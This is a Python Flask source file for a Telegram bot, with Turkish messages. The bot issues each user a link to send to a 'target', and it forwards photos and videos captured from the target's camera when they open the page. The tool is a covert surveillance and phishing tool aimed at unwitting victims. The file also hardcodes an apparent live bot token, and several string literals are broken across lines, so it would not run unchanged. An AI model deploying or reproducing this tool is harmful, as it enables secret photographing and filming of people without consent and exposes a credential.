import os
import logging
import uuid
import base64
from io import BytesIO
from flask import Flask, request, send_from_directory
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
import telegram

# ==================== CONFIG ====================
TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")

# Railway domain
RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
if RAILWAY_DOMAIN:
    WEBHOOK_URL = f"https://{RAILWAY_DOMAIN}"
else:
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://your-app.up.railway.app")

PORT = int(os.environ.get("PORT", 5000))

# Kullanici verileri
user_tokens = {}

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app
app = Flask(__name__, static_folder='static')

# Telegram Bot (sync)
bot = telegram.Bot(token=TOKEN)

# ==================== FLASK ROUTES ====================
@app.route(f"/{TOKEN}", methods=["POST"])
def telegram_webhook():
    json_data = request.get_json()

    # Mesaji isle
    if "message" in json_data and "text" in json_data["message"]:
        chat_id = json_data["message"]["chat"]["id"]
        user_id = json_data["message"]["from"]["id"]
        username = json_data["message"]["from"].get("username", "Bilinmiyor")
        text = json_data["message"]["text"]

        if text == "/start":
            token = str(uuid.uuid4()).replace("-", "")[:16]
            user_tokens[token] = {
                "user_id": user_id,
                "username": username,
                "chat_id": chat_id
            }

            link = f"{WEBHOOK_URL}/c/{token}"

            keyboard = [[InlineKeyboardButton("Linke Git", url=link)]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            # Emoji YOK - f-string sorunu olmasin
            message_text = (
                "Merhaba @" + username + "!

"
                "Ozel Linkiniz:
" + link + "

"
                "Bu linki hedefe gonderin.
"
                "Hedef linke tiklayinca kamera otomatik acilir!
"
                "Fotograf cekilip size aninda gonderilir."
            )

            bot.send_message(
                chat_id=chat_id,
                text=message_text,
                reply_markup=reply_markup
            )

    return "OK", 200

@app.route("/c/<token>")
def capture_page(token):
    if token not in user_tokens:
        return "<h1>Link gecersiz!</h1>", 404
    return send_from_directory("static", "capture.html")

@app.route("/upload/<token>", methods=["POST"])
def upload_photo(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    data = request.get_json()
    image_data = data.get("image", "")

    if not image_data:
        return {"error": "No image"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    try:
        image_bytes = base64.b64decode(image_data.split(",")[1])
    except:
        return {"error": "Invalid image"}, 400

    caption = "Yeni Fotograf!

Kullanici: @" + username + "
Token: " + token

    bot.send_photo(
        chat_id=chat_id,
        photo=BytesIO(image_bytes),
        caption=caption
    )

    return {"success": True}, 200

@app.route("/upload_video/<token>", methods=["POST"])
def upload_video(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    video_file = request.files.get("video")
    if not video_file:
        return {"error": "No video"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    caption = "Yeni Video!

Kullanici: @" + username

    bot.send_video(
        chat_id=chat_id,
        video=video_file.read(),
        caption=caption
    )

    return {"success": True}, 200

@app.route("/")
def home():
    return "Bot Aktif!"

# ==================== MAIN ====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
